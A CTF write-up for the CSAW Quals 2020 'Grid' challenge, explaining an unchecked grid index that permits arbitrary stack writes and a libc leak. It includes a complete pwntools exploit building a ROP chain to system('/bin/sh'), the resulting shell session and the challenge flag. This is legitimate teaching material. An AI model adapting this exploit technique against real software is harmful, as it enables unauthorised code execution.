---
title: Grid - CSAW Quals 2020
date: 2020-09-18 12:00:00
tags:
  - Exploitation
  - Linux
---

**tl;dr**
+ Out-of bounds index write allows byte-by-byte overwrite of return address

## Challenge description

***After millions of bugs, all my homies hate C.***

We are given a C++ binary, along with libc and libstdc files.

## Initial analysis

The mitigations enabled on the binary were as follows:

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

On reversing the binary, we found out that it had a 10x10 grid, and the binary had two main functions: one to insert a character into the grid, and one to display the grid. A loop was also present, which allowed us to insert/display values 100 times.

```text
shape> a
loc> 0 0
placing a at 0, 0
shape> d
Displaying
a!`�!
`O�%}
��B��#

-��#��
%}��f��
#s�%}�
>Z��#
D�
%}�H�%}
```

## Vulnerability

After reversing, it was pretty clear that there was no index check on the `insert` function, allowing us to insert at any location. Also the `display` function copied our current grid onto the stack, thus allowing us to potentially overwrite any value on the stack.

```cpp
for ( x = 0; x <= 99; ++x )
{
    std::operator<<<std::char_traits<char>>(&std::cout, "shape> ");
    std::operator>><char,std::char_traits<char>>(&std::cin, &v10);
    if ( v10 == 100 )
    {
        sub_400A57();
        for ( i = a1; i; i = *(_QWORD *)(i + 8) ) //Display function
            *((_BYTE *)&savedregs + 10 * *(unsigned __int8 *)(i + 1) + *(unsigned __int8 *)(i + 2) - 112) = *(_BYTE *)i;
        std::operator<<<std::char_traits<char>>(&std::cout, "Displaying\n");
        for ( j = 0; j <= 9; ++j )
        {
            for ( k = 0; k <= 9; ++k )
                std::operator<<<std::char_traits<char>>(&std::cout, (unsigned int)*((char *)&savedregs + 10 * j + k - 112));
            std::operator<<<std::char_traits<char>>(&std::cout, "\n");
        }
    }
    else //Insert function
    {
        std::operator<<<std::char_traits<char>>(&std::cout, "loc> ");
        v1 = std::istream::operator>>(&std::cin, &v11);
        std::istream::operator>>(v1, &v12);
        v2 = std::operator<<<std::char_traits<char>>(&std::cout, "placing ");
        v3 = std::operator<<<std::char_traits<char>>(v2, (unsigned int)v10);
        v4 = std::operator<<<std::char_traits<char>>(v3, " at ");
        v5 = std::ostream::operator<<(v4, v11);
        v6 = std::operator<<<std::char_traits<char>>(v5, ", ");
        v7 = std::ostream::operator<<(v6, v12);
        std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
        v8 = operator new(0x10uLL);
        sub_400E1E(v8, (unsigned int)v10, (unsigned __int8)v11, (unsigned __int8)v12);
        v16 = v8;
        sub_400E62(v14, v8);
        v14 = v16;
    }
}
```

From this, it was evident that we could write one character at a time onto an arbitrary location on the stack, thus allowing us to potentially overwrite both the return address, and the loop checker variable. This also allows us to bypass the canary, and directly overwrite the return address.

On further examination of the stack during the display function, it was obvious that the grid was not initialized, so displaying the grid allowed us to leak addresses off the stack. 

Great! We got a libc leak, all that was left was to calculate the grid offsets (as it was 10x10, and addresses are 8 bytes long), and our exploit was complete!

## Exploitation

The plan for the exploit was as follows:

+ Leak libc addresses off the stack using `display`
+ Overwrite the return address byte-by-byte with our ropchain (to call `system("\bin\sh")`)
+ Overwrite the checking variable with a value greater than 100 (0x64), to exit the loop
+ Use `display` to push the new grid onto the stack, completing the overwrite

```python
from pwn import *

env={'LD_PRELOAD' : './libc.so.6 ./libstdc.so.6.0.25'}
#r = process("./grid", env = env)
r=remote("pwn.chal.csaw.io",5013)

reu = lambda a : r.recvuntil(a)
sla = lambda a,b : r.sendlineafter(a,b)
sl = lambda a : r.sendline(a)
rel = lambda : r.recvline()
sa = lambda a,b : r.sendafter(a,b)
re = lambda a : r.recv(a)

def write(data1, data2):
    sla("shape> ",data1)
    sla("loc> ",data2)

def display():
    sla("shape> ","d")
    s = ""
    rel()
    for i in range(10):
        s+=rel().replace("\n","")
    return s

if __name__ == "__main__":
    leaks = []
    out = display()
    for i in range(0,len(out)-8,8):
        leaks.append(u64(out[i:i+8]))
    leak = leaks[3]
    log.info("Leak: " + hex(leak))
    libc_base = leak - 0x4ec5da
    log.info("Libc base: " + hex(libc_base))
    one_gadget = libc_base + 0x10a45c
    system = libc_base + 0x4f4e0
    log.info("System: " + hex(system))
    binsh = libc_base + 0x1b40fa
    pop_rdi = 0x400ee3
    pop_r1415 = 0x400ee0

    write(chr(int("0x"+hex(pop_rdi)[-2:],16)),"20 0")
    write(chr(int("0x"+hex(pop_rdi)[-4:-2],16)),"20 1")
    write(chr(int("0x"+hex(pop_rdi)[-6:-4],16)),"20 2")

    write(chr(int("0x"+hex(binsh)[-2:],16)),"20 8")
    write(chr(int("0x"+hex(binsh)[-4:-2],16)),"20 9")
    write(chr(int("0x"+hex(binsh)[-6:-4],16)),"21 0")
    write(chr(int("0x"+hex(binsh)[-8:-6],16)),"21 1")
    write(chr(int("0x"+hex(binsh)[-10:-8],16)),"21 2")
    write(chr(int("0x"+hex(binsh)[-12:-10],16)),"21 3")

    write(chr(int("0x"+hex(pop_r1415)[-2:],16)),"21 6")
    write(chr(int("0x"+hex(pop_r1415)[-4:-2],16)),"21 7")
    write(chr(int("0x"+hex(pop_r1415)[-6:-4],16)),"21 8")
    write(chr(int("0x00",16)),"21 9")
    write(chr(int("0x00",16)),"22 0")
    write(chr(int("0x00",16)),"22 1")

    write(chr(int("0x"+hex(system)[-2:],16)),"24 0")
    write(chr(int("0x"+hex(system)[-4:-2],16)),"24 1")
    write(chr(int("0x"+hex(system)[-6:-4],16)),"24 2")
    write(chr(int("0x"+hex(system)[-8:-6],16)),"24 3")
    write(chr(int("0x"+hex(system)[-10:-8],16)),"24 4")
    write(chr(int("0x"+hex(system)[-12:-10],16)),"24 5")

    write("z","14 1")
    display()
    log.info("Write complete!")
    r.interactive()
```

## Flag

Running this exploit gives us the flag!

```console
d4rk_kn1gh7 @ BatMobile  python grid.py
[+] Opening connection to pwn.chal.csaw.io on port 5013: Done
[*] Leak: 0x7f40890395da
[*] Libc base: 0x7f4088b4d000
[*] System: 0x7f4088b9c4e0
[*] Write complete!
[*] Switching to interactive mode
$ ls
flag.txt
grid
$ cat flag.txt
flag{but_4ll_l4ngu4g3s_R_C:(}
```